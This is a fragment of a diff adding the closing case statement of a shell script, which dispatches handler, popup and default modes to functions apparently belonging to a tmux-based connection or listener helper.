+  handler)
+    handle_connection
+    ;;
+  popup)
+    case "$POPUP_ACTION" in
+      f1)       popup_f1 ;;
+      f2)       popup_f2 ;;
+      f5)       popup_f5 ;;
+      f9)       popup_f9 ;;
+      ctrlc)    popup_ctrlc ;;
+      listener) popup_listener ;;
+      *)        echo "unknown popup action: $POPUP_ACTION" >&2; exit 1 ;;
+    esac
+    ;;
+  *)
+    export LOGDIR
+    export PREPEND_SPACE
+    start_tmuxer
+    ;;
+esac
